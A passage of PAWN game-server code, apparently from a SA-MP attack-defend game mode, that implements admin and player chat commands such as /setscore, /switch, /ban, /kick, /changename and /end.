    		TextDrawHideForPlayer(Params[0], AttackerTeam[0]);
   			TextDrawHideForPlayer(Params[0], AttackerTeam[1]);
   			TextDrawHideForPlayer(Params[0], DefenderTeam[0]);
   			TextDrawHideForPlayer(Params[0], DefenderTeam[1]);
       	}
	}

	if(MyVehicle != -1) {
	    PutPlayerInVehicle(Params[0], MyVehicle, Seat);

		if(GetPlayerState(Params[0]) == PLAYER_STATE_DRIVER) {
			switch(Player[Params[0]][Team]) {
				case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(Params[0]), 175, 175);
				case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(Params[0]), 158, 158);
				case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(Params[0]), 198, 198);
				case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(Params[0]), 208, 208);
				case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(Params[0]), 200, 200);
			}
		}

	}

    new iString[150];
	if(Player[Params[0]][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[Params[0]][RoundKills], MAIN_TEXT_COLOUR, Player[Params[0]][RoundDamage], MAIN_TEXT_COLOUR, Player[Params[0]][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[Params[0]][RoundKills], MAIN_TEXT_COLOUR, Player[Params[0]][RoundDamage], MAIN_TEXT_COLOUR, Player[Params[0]][TotalDamage]);
	PlayerTextDrawSetString(Params[0], RoundKillDmgTDmg, iString);

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has switched {FFFFFF}%s "COL_PRIM"to: {FFFFFF}%s", Player[playerid][Name], Player[Params[0]][Name], TeamName[Params[1]+1]);
	SendClientMessageToAll(-1, iString);
	return 1;
}

CMD:setscore(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(!WarMode) return SendErrorMessage(playerid, "Warmode is not enabled.");

	new TeamID, Score;
	if(sscanf(params, "dd", TeamID, Score)) return SendUsageMessage(playerid,"/setscore [Team ID (0 Att | 1 Def)] [Score]");

	if(TeamID < 0 || TeamID > 1) return SendErrorMessage(playerid,"Invalid team ID.");
	if(Score < 0 || Score > 100) return SendErrorMessage(playerid,"Score can only be between 0 and 100.");

	new iString[128];
	if(TeamID == 0) {
		if((Score + TeamScore[DEFENDER]) >= TotalRounds) return SendErrorMessage(playerid,"Attacker plus defender score is bigger than or equal to the total rounds.");
		TeamScore[ATTACKER] = Score;
        format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set attacker team score to: {FFFFFF}%d", Player[playerid][Name], TeamScore[ATTACKER]);
	} else {
   		if((Score + TeamScore[ATTACKER]) >= TotalRounds) return SendErrorMessage(playerid,"Attacker plus defender score is bigger than or equal to the total rounds.");
		TeamScore[DEFENDER] = Score;
		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set defender team score to: {FFFFFF}%d", Player[playerid][Name], TeamScore[DEFENDER]);
	}
 	SendClientMessageToAll(-1, iString);

    CurrentRound = TeamScore[ATTACKER] + TeamScore[DEFENDER];

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
	TextDrawSetString(RoundsPlayed, iString);

    LogAdminCommand("setscore", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:changepass(playerid, params[])
{
	if(Player[playerid][Logged] == false) return SendErrorMessage(playerid,"You must be logged in.");
	if(isnull(params)) return SendUsageMessage(playerid,"/changepass [New Password]");
	if(strlen(params) < 3) return SendErrorMessage(playerid,"Password too short (Minimum 3 characters).");
	
	new HashPass[140];
	format(HashPass, sizeof(HashPass), "%d", udb_hash(params));

	new iString[356];
	format(iString, sizeof(iString), "UPDATE Players SET Password = '%s' WHERE Name = '%s'", HashPass, DB_Escape(Player[playerid][Name]));
    db_free_result(db_query(sqliteconnection, iString));

	format(HashPass, sizeof(HashPass), "Your password is changed to: %s", params);
	SendClientMessage(playerid, -1, HashPass);
	return 1;
}

CMD:changename(playerid,params[])
{
    if(!ChangeName) return SendErrorMessage(playerid, "/changename command is disabled in this server.");
	if(Player[playerid][Logged] == false) return SendErrorMessage(playerid,"You must be logged in.");
	if(Player[playerid][Mute]) return SendErrorMessage(playerid, "Cannot use this command when you're muted.");
	if(isnull(params)) return SendUsageMessage(playerid,"/changename [New Name]");
	if(strlen(params) <= 1) return SendErrorMessage(playerid,"Name cannot be that short idiot!!");

	switch( SetPlayerName(playerid,params) )
	{
	    case 1:
	    {
	        //success
	        new iString[128],
				DBResult: result
			;

			format( iString, sizeof(iString), "SELECT * FROM `Players` WHERE `Name` = '%s'", DB_Escape(params) );
			result = db_query(sqliteconnection, iString);

			if( db_num_rows(result) > 0 )
			{
			    db_free_result(result);
			    //name in Use in DB.
			    SetPlayerName( playerid, Player[playerid][Name] );
			    return SendErrorMessage(playerid,"Name already registered!");
			}
			else
			{
			    db_free_result(result);
			    //name changed successfully!!

				format(iString, sizeof(iString),">> {FFFFFF}%s "COL_PRIM"has changed name to {FFFFFF}%s",Player[playerid][Name],params);
				SendClientMessageToAll(-1,iString);

				format(iString, sizeof(iString), "UPDATE `Players` SET `Name` = '%s' WHERE `Name` = '%s'", DB_Escape(params), DB_Escape(Player[playerid][Name]) );
				db_free_result(db_query(sqliteconnection, iString));

				format( Player[playerid][Name], MAX_PLAYER_NAME, "%s", params );

			    new NewName[MAX_PLAYER_NAME];
				NewName = RemoveClanTagFromName(playerid);

				if(strlen(NewName) != 0)
					Player[playerid][NameWithoutTag] = NewName;
				else
					Player[playerid][NameWithoutTag] = Player[playerid][Name];

			    return 1;
			}
	    }
		case 0: return SendErrorMessage(playerid,"You're already using that name.");
		case -1: return SendErrorMessage(playerid,"Either Name is too long, already in use or has invalid characters.");
	}
	return 1;
}

CMD:heal(playerid, params[])
{
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't heal while playing.");
	if(Player[playerid][AntiLag] == true) return SendErrorMessage(playerid,"Can't heal in anti-lag zone.");
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");

	SetHP(playerid, 100);
	SetAP(playerid, 100);

	return 1;
}


CMD:rr(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Please wait.");

	AllowStartBase = false;
	if(RoundPaused == true)
		TextDrawHideForAll(PauseTD);
    RoundPaused = false;
    RoundUnpausing = false;
   	
	new iString[180];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has restarted the round. Round restarting...", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);

 	for( new i; i < 10; i ++ ) { // Reset the number of times a weapon is picked for each team.
        TimesPicked[ATTACKER][i] = 0;
        TimesPicked[DEFENDER][i] = 0;
    }

	if(GameType == BASE) {
	    BaseStarted = false;
		SetTimerEx("OnBaseStart", 4000, false, "i", Current);
	} else if(GameType == ARENA || GameType == TDM) {
	    ArenaStarted = false;
		SetTimerEx("OnArenaStart", 4000, false, "i", Current);
	}

	foreach(new i : Player) {
		VehiclePos[i][0] = 0.0;
		VehiclePos[i][1] = 0.0;
		VehiclePos[i][2] = 0.0;

	    if(CanPlay(i)) {
			if(Player[i][Spectating] == true) StopSpectate(i);
			Player[i][WasInCP] = false;

			Player[i][WasInBase] = false;
			Player[i][WeaponPicked] = 0;
			Player[i][TimesSpawned] = 0;

			HideDialogs(i);
            DisablePlayerCheckpoint(i);
            RemovePlayerMapIcon(i, 59);

			PlayerTextDrawHide(i, AreaCheckTD);
			PlayerTextDrawHide(i, AreaCheckBG);
			PlayerTextDrawHide(i, RoundText);
			TogglePlayerControllableEx(i, false);
			Player[i][ToAddInRound] = true;
		}
	}

	foreach(new i:Player)
	{
		if(Player[i][Style] == 0) TextDrawHideForPlayer(i, RoundStats);
		else HideRoundStats(i);
	}
    TextDrawHideForAll(EN_CheckPoint);
	return 1;
}

CMD:aka(playerid, params[]) {

    if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 3 admin to do that.");

	new pID;
    if(sscanf(params, "u", pID)) {
        pID = playerid;
    }
    if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");

    AKAString = "";
	AKAString = GetPlayerAKA(pID);
	format(AKAString, sizeof(AKAString), "{FFFFFF}%s", AKAString);

	new title[50];
	format(title, sizeof(title), ""COL_PRIM"%s's AKA", Player[pID][Name]);
    ShowPlayerDialog(playerid, DIALOG_AKA, DIALOG_STYLE_MSGBOX,title,AKAString,"Close","");

    return 1;
}


CMD:afk(playerid, params[])
{
	new pID;
	if(isnull(params)) pID = playerid;
	else {
		if(!IsNumeric(params)) return SendUsageMessage(playerid,"/afk [Player ID (Optional)]");
		if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
		pID = strval(params);
	}
    if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");

	if(Player[pID][Playing] == true) RemovePlayerFromRound(pID);
	if(Player[pID][Spectating] == true) StopSpectate(pID);
	if(Player[pID][InDM] == true) QuitDM(pID);
	if(Player[pID][InDuel] == true) return SendErrorMessage(pID,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");

	Player[pID][Team] = NON;
	SetPlayerColor(pID, 0xAAAAAAAA);
	TogglePlayerControllableEx(pID, false);
	Player[pID][IsAFK] = true;

	new iString[128];
	if(pID != playerid) {
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set {FFFFFF}%s "COL_PRIM"to AFK mode.", Player[playerid][Name], Player[pID][Name]);
	} else {
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set himself to AFK mode.", Player[pID][Name]);
	}
 	SendClientMessageToAll(-1, iString);
	return 1;
}

CMD:setafk(playerid, params[])
{
    if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/setafk [Player ID]");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[pID][Playing] == true) RemovePlayerFromRound(pID);
	if(Player[pID][Spectating] == true) StopSpectate(pID);
	if(Player[pID][InDM] == true) QuitDM(pID);
	if(Player[pID][InDuel] == true) return SendErrorMessage(playerid,"That player is in a duel");

	Player[pID][Team] = NON;
	SetPlayerColor(pID, 0xAAAAAAAA);
	TogglePlayerControllableEx(pID, false);
	Player[pID][IsAFK] = true;

	new iString[128];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set {FFFFFF}%s "COL_PRIM"to AFK mode.", Player[playerid][Name], Player[pID][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("setafk", playerid, pID);
	return 1;
}

CMD:back(playerid, params[])
{
	if(Player[playerid][IsAFK] != true)
	    return SendErrorMessage(playerid,"You are not AFK?");
	Player[playerid][Team] = REFEREE;
    TogglePlayerControllableEx(playerid, true);
    Player[playerid][IsAFK] = false;
    SetHP(playerid, 100);
	new iString[64];
 	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"is back from AFK mode.", Player[playerid][Name]);
 	SendClientMessageToAll(-1, iString);
 	
	format(iString, sizeof(iString), "%s%s\n%s%s Sub\n%s%s\n%s%s Sub\n%sReferee", TextColor[ATTACKER], TeamName[ATTACKER], TextColor[ATTACKER_SUB], TeamName[ATTACKER], TextColor[DEFENDER], TeamName[DEFENDER], TextColor[DEFENDER_SUB], TeamName[DEFENDER], TextColor[REFEREE]);
	ShowPlayerDialog(playerid, DIALOG_SWITCH_TEAM, DIALOG_STYLE_LIST, "{FFFFFF}Team Selection",iString, "Select", "");

	return 1;
}

CMD:swap(playerid, params[])
{
 	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current != -1) return SendErrorMessage(playerid,"Can't swap while round is active.");

	SwapTeams();

	new iString[160];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has swapped the teams.", Player[playerid][Name]);
	SendClientMessage(playerid, -1, iString);

	return 1;
}

CMD:balance(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current != -1) return SendErrorMessage(playerid,"Can't balance when round is active.");

	BalanceTeams();

	new iString[160];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has balanced the teams.", Player[playerid][Name]);
	SendClientMessage(playerid, -1, iString);

	return 1;
}



CMD:switch(playerid, params[])
{
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't switch while playing.");
	if(Player[playerid][Spectating] == true) StopSpectate(playerid);

	new iString[128];
	format(iString, sizeof(iString), "%s%s\n%s%s Sub\n%s%s\n%s%s Sub\n%sReferee", TextColor[ATTACKER], TeamName[ATTACKER], TextColor[ATTACKER_SUB], TeamName[ATTACKER], TextColor[DEFENDER], TeamName[DEFENDER], TextColor[DEFENDER_SUB], TeamName[DEFENDER], TextColor[REFEREE]);
	ShowPlayerDialog(playerid, DIALOG_SWITCH_TEAM, DIALOG_STYLE_LIST, "{FFFFFF}Team Selection",iString, "Select", "Exit");

    return 1;
}


CMD:mainspawn(playerid, params[])
{
 	if(Player[playerid][Level] < 4 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	GetPlayerPos(playerid, MainSpawn[0], MainSpawn[1], MainSpawn[2]);
	GetPlayerFacingAngle(playerid, MainSpawn[3]);
	MainInterior = GetPlayerInterior(playerid);

	new iString[128], query[256];
	format(iString, sizeof(iString), "%.0f,%.0f,%.0f,%.0f,%d", MainSpawn[0], MainSpawn[1], MainSpawn[2], MainSpawn[3], MainInterior);
	format(query, sizeof(query), "UPDATE Configs SET Value = '%s' WHERE Option = 'Main Spawn'", iString);
    db_free_result(db_query(sqliteconnection, query));

    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed the main spawn location.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("mainspawn", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:givemenu(playerid, params[])
{
 	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");
	#if ENABLED_TDM == 1
	if(GameType == TDM) return SendErrorMessage(playerid,"TDM doesn't have a weapon menu.");
	#endif
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/givemenu [Player ID]");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[pID][Playing] == false) return SendErrorMessage(playerid,"That player isn't playing.");

	if(Player[pID][Team] == ATTACKER || Player[pID][Team] == DEFENDER) {
		switch(GameType) {
		    case BASE: ShowPlayerWeaponMenu(pID, Player[pID][Team]);
		    case ARENA: GivePlayerArenaWeapons(pID);
		}
	}

    new iString[180];
    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has showed {FFFFFF}%s "COL_PRIM"weapon menu.", Player[playerid][Name], Player[pID][Name]);
    SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:gunmenu(playerid, params[])
{
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");
	if(Player[playerid][Playing] == false) return SendErrorMessage(playerid,"You are not playing.");

	if(ElapsedTime <= 30 && Player[playerid][Team] != REFEREE) {
		if(GameType == BASE) ShowPlayerWeaponMenu(playerid, Player[playerid][Team]);
		else if(GameType == ARENA || GameType == TDM) GivePlayerArenaWeapons(playerid);

	    new iString[180];
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has showed weapon menu for himself.", Player[playerid][Name]);

		foreach(new i : Player) {
		    if(Player[playerid][Team] == ATTACKER) {
		        if(Player[i][Team] == ATTACKER) {
		            SendClientMessage(i, -1, iString);
				}
			} else if(Player[playerid][Team] == DEFENDER) {
			    if(Player[i][Team] == DEFENDER) {
			        SendClientMessage(i, -1, iString);
				}
			}
		}
	} else {
		SendErrorMessage(playerid,"Too late to show yourself weapon menu.");
	}

	return 1;
}

CMD:addall(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");

	foreach(new i : Player) {
		if(Player[i][Playing] == false && Player[i][InDuel] == false && (Player[i][Team] == ATTACKER || Player[i][Team] == DEFENDER)) {
			if(GameType == BASE) AddPlayerToBase(i);
		    else if(GameType == ARENA || GameType == TDM) AddPlayerToArena(i);
		}
	}

    new iString[64];
    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has added everyone to the round.", Player[playerid][Name]);
    SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:add(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/add [Player ID]");
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[pID][Playing] == true) return SendErrorMessage(playerid,"That player is already playing.");
	if(Player[pID][Spectating] == true) StopSpectate(pID);  //no more need to ask players to do /specoff in order to add them
	if(Player[pID][InDuel] == true) return SendErrorMessage(playerid,"That player is in a duel.");
	if(Player[pID][Team] == ATTACKER || Player[pID][Team] == DEFENDER || Player[pID][Team] == REFEREE) {
		if(GameType == BASE) AddPlayerToBase(pID);
		else if(GameType == ARENA || GameType == TDM) AddPlayerToArena(pID);

	    new iString[128];
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has added {FFFFFF}%s "COL_PRIM"to the round.", Player[playerid][Name], Player[pID][Name]);
	    SendClientMessageToAll(-1, iString);

	} else {
	    SendErrorMessage(playerid,"That player must be part of one of the following teams: Attacker, Defender or Referee.");
	}
    LogAdminCommand("add", playerid, pID);
	return 1;
}

CMD:readd(playerid, params[])
{
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");

	if(isnull(params)) {
	    if(ElapsedTime <= 20) {
			if(Player[playerid][Team] == ATTACKER || Player[playerid][Team] == DEFENDER || Player[playerid][Team] == REFEREE) {
				if(GameType == BASE) AddPlayerToBase(playerid);
				else if(GameType == ARENA || GameType == TDM) AddPlayerToArena(playerid);

			    new iString[64];
			    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has re-added himself to the round.", Player[playerid][Name]);
			    SendClientMessageToAll(-1, iString);
			} else {
	    		SendErrorMessage(playerid,"You must be part of one of the following teams: Attacker, Defender or Referee.");
			}
		} else {
	    	SendErrorMessage(playerid,"Too late to readd yourself.");
		}
	} else {
 		if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
		if(!IsNumeric(params)) return SendUsageMessage(playerid,"/readd [Player ID]");

		new pID = strval(params);
		if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
		if(Player[pID][Team] == ATTACKER || Player[pID][Team] == DEFENDER || Player[pID][Team] == REFEREE) {
			if(Player[pID][Playing] == true) {
			    Player[pID][TotalKills] = Player[pID][TotalKills] - Player[pID][RoundKills];
			    Player[pID][TotalDeaths] = Player[pID][TotalDeaths] - Player[pID][RoundDeaths];
				Player[pID][TotalDamage] = Player[pID][TotalDamage] - Player[pID][RoundDamage];

			}
			if(GameType == BASE) AddPlayerToBase(pID);
			else if(GameType == ARENA || GameType == TDM) AddPlayerToArena(pID);

		    new iString[128];
		    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has re-added {FFFFFF}%s "COL_PRIM"to the round.", Player[playerid][Name], Player[pID][Name]);
		    SendClientMessageToAll(-1, iString);
		    LogAdminCommand("readd", playerid, pID);
		} else {
	    	SendErrorMessage(playerid,"That player must be part of one of the following teams: Attacker, Defender or Referee.");
		}
	}

	return 1;
}

CMD:rem(playerid, params[])
{
	if(Player[playerid][Playing] == false) return SendErrorMessage(playerid,"You are not playing.");
	if(ElapsedTime > 60) return SendErrorMessage(playerid,"Too late to remove yourself.");

    new iString[128], Float:HP[2];
    GetHP(playerid, HP[0]);
    GetAP(playerid, HP[1]);

    format(iString, sizeof(iString), "{FFFFFF}%s (%d) "COL_PRIM"removed himself from round. {CCCCCC}HP %.0f | Armour %.0f", Player[playerid][Name], playerid, HP[0], HP[1]);
    SendClientMessageToAll(-1, iString);

	RemovePlayerFromRound(playerid);
    return 1;
}


CMD:remove(playerid, params[])
{
 	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/remove [Player ID]");

	new pID = strval(params);

    new iString[128], Float:HP[2];
    GetHP(pID, HP[0]);
    GetAP(pID, HP[1]);

	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[pID][Playing] == false) return SendErrorMessage(playerid,"That player is not playing.");

    format(iString, sizeof(iString), "{FFFFFF}%s (%d) "COL_PRIM"removed {FFFFFF}%s (%d) "COL_PRIM"from round. {CCCCCC}HP %.0f | Armour %.0f", Player[playerid][Name], playerid, Player[pID][Name], pID, HP[0], HP[1]);
    SendClientMessageToAll(-1, iString);

	RemovePlayerFromRound(pID);
    LogAdminCommand("remove", playerid, pID);
    return 1;
}


CMD:end(playerid, params[])
{
   	if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Please Wait.");
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");

	Current = -1;
	if(RoundPaused == true)
		TextDrawHideForAll(PauseTD);
		
	RoundPaused = false;
	FallProtection = false;
    PlayersInCP = 0;

	PlayersAlive[ATTACKER] = 0;
	PlayersAlive[DEFENDER] = 0;

    RoundUnpausing = false;

	foreach(new i : Player) {
		VehiclePos[i][0] = 0.0;
		VehiclePos[i][1] = 0.0;
		VehiclePos[i][2] = 0.0;

		Player[i][Playing] = false;
		Player[i][WasInCP] = false;
		if(Player[i][Spectating] == true) StopSpectate(i);
		Player[i][WasInBase] = false;
		Player[i][WeaponPicked] = 0;
		Player[i][TimesSpawned] = 0;
		Player[i][VoteToAddID] = -1;
		Player[i][VoteToNetCheck] = -1;
		Player[i][Votekick] = -1;

		TogglePlayerControllableEx(i, true);
		RemovePlayerMapIcon(i, 59);

		SpawnPlayerEx(i);

		DisablePlayerCheckpoint(i);
		SetPlayerScore(i, 0);
		HideDialogs(i);

		PlayerTextDrawHide(i, AreaCheckTD);
		PlayerTextDrawHide(i, AreaCheckBG);

		TextDrawHideForPlayer(i, AttackerTeam[0]);
		TextDrawHideForPlayer(i, AttackerTeam[1]);
		TextDrawHideForPlayer(i, DefenderTeam[0]);
		TextDrawHideForPlayer(i, DefenderTeam[1]);
		TextDrawHideForPlayer(i, AttackerTeam[2]);
		TextDrawHideForPlayer(i, AttackerTeam[3]);
		TextDrawHideForPlayer(i, DefenderTeam[2]);
		TextDrawHideForPlayer(i, DefenderTeam[3]);
	}

	foreach(new i:Player)
	{
		if(Player[i][Style] == 0) TextDrawHideForPlayer(i, RoundStats);
		else HideRoundStats(i);
	}
	TextDrawHideForAll(EN_CheckPoint);
	
 	for( new i; i < 10; i ++ ) { // Reset the number of times a weapon is picked for each team.
        TimesPicked[ATTACKER][i] = 0;
        TimesPicked[DEFENDER][i] = 0;
    }

	BaseStarted = false;
	ArenaStarted = false;

    SendRconCommand("mapname Lobby");
	SetGameModeText(GM_NAME);

	new iString[64];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has ended the round.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);


	TextDrawSetString(AttackerTeam[0], "_");
	TextDrawSetString(AttackerTeam[1], "_");
	TextDrawSetString(DefenderTeam[0], "_");
	TextDrawSetString(DefenderTeam[1], "_");
	TextDrawSetString(AttackerTeam[2], "_");
	TextDrawSetString(AttackerTeam[3], "_");
	TextDrawSetString(DefenderTeam[2], "_");
	TextDrawSetString(DefenderTeam[3], "_");

    GangZoneDestroy(CPZone);
	GangZoneDestroy(ArenaZone);

	ResetTeamLeaders();

    LogAdminCommand("end", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:ban(playerid, params[])
{
	if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Can't ban now. Please wait.");

	new pID, Reason[128], iString[256];
	if(sscanf(params, "ds", pID, Reason)) return SendUsageMessage(playerid,"/ban [Player ID] [Reason]");

	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[pID][Level] >= Player[playerid][Level]) return SendErrorMessage(playerid,"Can't ban someone of same or higher admin level.");
	if(strlen(Reason) > 128) return SendErrorMessage(playerid,"Reason is too big.");

    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has banned {FFFFFF}%s "COL_PRIM"| Reason: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name], /*IP,*/ Reason);
	SendClientMessageToAll(-1, iString);

	Player[pID][DontPause] = true;

	format(iString, sizeof(iString), "%s - %s", Player[playerid][Name], Reason);
	BanEx(pID, iString);
	
    LogAdminCommand("ban", playerid, pID);
	return 1;
}

CMD:unbanip(playerid,params[])
{
	if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(isnull(params)) return SendUsageMessage(playerid,"/unbanip [IP]");

	new iString[128];
	format(iString, sizeof(iString), "unbanip %s", params);
	SendRconCommand(iString);
	SendRconCommand("reloadbans");
	
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unbanned IP: {FFFFFF}%s",Player[playerid][Name], params);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("unbanip", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:kick(playerid, params[])
{
	if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Can't kick now. Please wait.");

	new Params[2][128], iString[180];
	sscanf(params, "ss", Params[0], Params[1]);
	if(isnull(Params[0]) || !IsNumeric(Params[0])) return SendUsageMessage(playerid,"/kick [Player ID] [Reason]");
	new pID = strval(Params[0]);

	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[pID][Level] >= Player[playerid][Level]) return SendErrorMessage(playerid,"Can't kick someone of same or higher admin level.");

	new bool:GiveReason;
	if(isnull(Params[1])) GiveReason = false;
	else GiveReason = true;

	if(GiveReason == false) {
		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has kicked {FFFFFF}%s "COL_PRIM"| Reason: {FFFFFF}No Reason Given", Player[playerid][Name], Player[pID][Name]);
		SendClientMessageToAll(-1, iString);
	} else {
		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has kicked {FFFFFF}%s "COL_PRIM"| Reason: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name], Params[1]);
		SendClientMessageToAll(-1, iString);
	}

    Player[pID][DontPause] = true;
    SetTimerEx("OnPlayerKicked", 500, false, "i", pID);
    LogAdminCommand("kick", playerid, pID);
	return 1;
}


CMD:healall(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	if(Current == -1) return SendErrorMessage(playerid,"There is no active round.");
	foreach(new i : Player) {
	    if(Player[i][Playing] == true) {
	        SetHP(i, RoundHP);
		}
	}

	new iString[64];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has healed everyone.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:hl(playerid, params[])
{
	cmd_healall(playerid, params);
	return 1;
}

CMD:al(playerid, params[])
{
	cmd_armourall(playerid, params);
	return 1;
}

CMD:nolag(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");


    if(Current != -1)
		return SendErrorMessage(playerid, "You cannot do this while round is in progress.");

